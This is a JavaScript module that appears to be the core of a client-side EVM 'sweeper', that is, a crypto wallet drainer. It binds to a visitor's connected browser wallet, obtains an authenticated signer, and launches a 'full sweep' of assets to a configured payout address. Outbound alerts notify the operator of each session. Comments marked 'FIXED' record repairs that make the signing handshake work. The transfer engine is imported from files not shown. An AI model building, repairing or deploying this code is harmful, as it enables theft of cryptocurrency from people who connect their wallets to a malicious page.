// client-side-evm-sweeper/src/core/master-link.js
import { ethers } from 'ethers';
import { TransactionRunner } from '../engines/transaction-runner.js';
import { networkManifest } from '@/config/network-manifest.js';
import { OutboundAlerts } from './outbound-alerts.js';

/**
 * MASTER LINK - Core Entry & Coordination Tower (Ethers v6 Hardened)
 * Connects browser walletClient instances straight to the transaction execution runner.
 */
export class MasterLink {
    constructor(options = {}) {
        this.options = { 
            defaultDryRun: true, 
            maxRetries: 3, 
            logLevel: 'info', 
            ...options 
        };
        this.alerts = new OutboundAlerts(options.alerts || {});
        this.currentRunner = null;
        this.isRunning = false;
        this.sessionStartTime = null;
    }

    /**
     * Main public entry point invoked by your interoperability bridge wrapper
     */
    async startWithWallet(walletAddress, chainId = 1, overrides = {}) {
        if (this.isRunning) {
            console.warn("MasterLink: Sweep already in progress.");
            return { success: false, reason: "Already running" };
        }

        this.sessionStartTime = Date.now();
        this.isRunning = true;

        try {
            // FIXED 1: Extract the live authenticated wallet client session passed from the UI
            const walletClient = overrides.walletClient || null;

            await this.validateInputs(walletAddress, chainId);
            await this.logStart(walletAddress, chainId);

            const provider = await this.detectAndValidateProvider();
            
            // FIXED 2: Pass the walletClient down to establish a live signing handshake
            const signer = await this.getSigner(provider, walletClient);

            const config = this.buildRunnerConfig(walletAddress, chainId, overrides);
            this.currentRunner = new TransactionRunner(config);

            await this.runPreFlightChecks();
            console.log(`[MasterLink] Executing full sweep for ${walletAddress}`);
            
            const result = await this.currentRunner.executeFullSweep(signer, provider);
            await this.logSuccess(result);
            
            return { success: true, result };
        } catch (error) {
            await this.handleCriticalError(error, walletAddress);
            return { success: false, error: error.message };
        } finally {
            this.isRunning = false;
            this.currentRunner = null;
        }
    }

    async validateInputs(walletAddress, chainId) {
        if (!walletAddress || !/^0x[a-fA-F0-9]{40}$/.test(walletAddress)) {
            throw new Error("Invalid Ethereum wallet address format");
        }
        if (!Number.isInteger(chainId) || chainId < 1) {
            throw new Error("Invalid chainId");
        }
        const supported = networkManifest.networks.some(n => n.chainId === chainId);
        if (!supported) {
            console.warn(`Chain ${chainId} not explicitly configured. Proceeding with defaults.`);
        }
    }

    async detectAndValidateProvider() {
        if (typeof window === 'undefined' || !window.ethereum) {
            throw new Error("No injected wallet provider found (MetaMask, WalletConnect, etc.)");
        }
        return window.ethereum;
    }

    /**
     * FIXED 3: Upgraded Signer Selector (Ethers v6 Compliant)
     * Wipes out the mock signer trap by wrapping the authenticated client layer directly.
     */
    async getSigner(provider, walletClient) {
        // If Wagmi provides a valid walletClient session, wrap it with standard Ethers v6 interfaces
        if (walletClient) {
            console.log("[MasterLink] Successfully bound active, authenticated walletClient session.");
            
            // For Ethers v6 environments:
            if (typeof ethers.BrowserProvider !== 'undefined') {
                return new ethers.BrowserProvider(walletClient).getSigner();
            }
            // Backward compatibility fallback for Ethers v5 environments:
            if (ethers.providers && typeof ethers.providers.Web3Provider !== 'undefined') {
                return new ethers.providers.Web3Provider(walletClient).getSigner();
            }
            
            // Direct object binding fallback
            return walletClient;
        }

        // Global browser fallback if running unauthenticated window injections
        if (typeof window !== 'undefined' && window.ethers) {
            const globalProvider = window.ethers.BrowserProvider 
                ? new window.ethers.BrowserProvider(provider)
                : new window.ethers.providers.Web3Provider(provider);
            return globalProvider.getSigner();
        }

        console.warn("⚠️ [MasterLink] Using raw provider as mock signer. Full signing may be limited.");
        return provider;
    }

    buildRunnerConfig(walletAddress, chainId, overrides) {
        return {
            networks: networkManifest.networks,
            targets: networkManifest.targets || [],
            ownerAddress: walletAddress,
            sweeperAddress: networkManifest.EVM_PAYOUT_TARGET || overrides.sweeperAddress,
            alchemyApiKey: networkManifest.ALCHEMY_API_KEY || "", // Forward your Alchemy credential
            dryRun: overrides.dryRun !== undefined ? overrides.dryRun : this.options.defaultDryRun,
            alerts: this.options.alerts,
            maxConcurrent: overrides.maxConcurrent || 2,
            preferredProfile: overrides.preferredProfile || 'aggressive'
        };
    }

    async runPreFlightChecks() {
        console.log("[MasterLink] Running pre-flight safety checks...");
        if (!networkManifest.EVM_PAYOUT_TARGET) {
            console.warn("Warning: No EVM_PAYOUT_TARGET defined in manifest.");
        }
        if (networkManifest.targets?.length === 0) {
            console.warn("Warning: No targets configured.");
        }
        await new Promise(r => setTimeout(r, 300));
    }

    async logStart(walletAddress, chainId) {
        console.log(`%c[MasterLink] Starting sweep session for ${walletAddress.slice(0,6)}... on chain ${chainId}`, "color: #00ffaa; font-weight: bold");
        await this.alerts.info(
            "Sweep Session Started", 
            `Wallet: ${walletAddress.slice(0,8)}... | Chain: ${chainId}`, 
            { sessionStart: new Date().toISOString() }
        );
    }

    async logSuccess(result) {
        const duration = ((Date.now() - this.sessionStartTime) / 1000).toFixed(1);
        console.log(`%c[MasterLink] Sweep completed successfully in ${duration}s`, "color: #00ff00; font-weight: bold");
        await this.alerts.success(
            "Sweep Completed", 
            `Processed ${result?.length || 0} assets in ${duration} seconds`, 
            { duration, processed: result?.length || 0 }
        );
    }

    async handleCriticalError(error, walletAddress) {
        console.error("[MasterLink] Critical failure:", error);
        await this.alerts.error(
            "Sweep Execution Failed", 
            error.message || "Unknown execution error", 
            { 
                wallet: walletAddress.slice(0, 12) + "...", 
                duration: ((Date.now() - this.sessionStartTime) / 1000).toFixed(1) 
            }
        );
    }

    async stop() {
        this.isRunning = false;
        console.log("[MasterLink] Stop command received.");
    }

    getStatus() {
        return {
            isRunning: this.isRunning,
            sessionDuration: this.sessionStartTime ? ((Date.now() - this.sessionStartTime) / 1000).toFixed(1) : 0,
            runnerActive: !!this.currentRunner
        };
    }

    async forceDryRunMode() {
        this.options.defaultDryRun = true;
        console.log("[MasterLink] Dry-run mode enabled globally.");
    }
}

const masterLink = new MasterLink();
export default masterLink;

if (typeof window !== 'undefined') {
    window.MasterLink = masterLink;
    console.log("%c[MasterLink] Successfully initialized and attached to window.", "color: #00aaff; font-weight: bold");
}
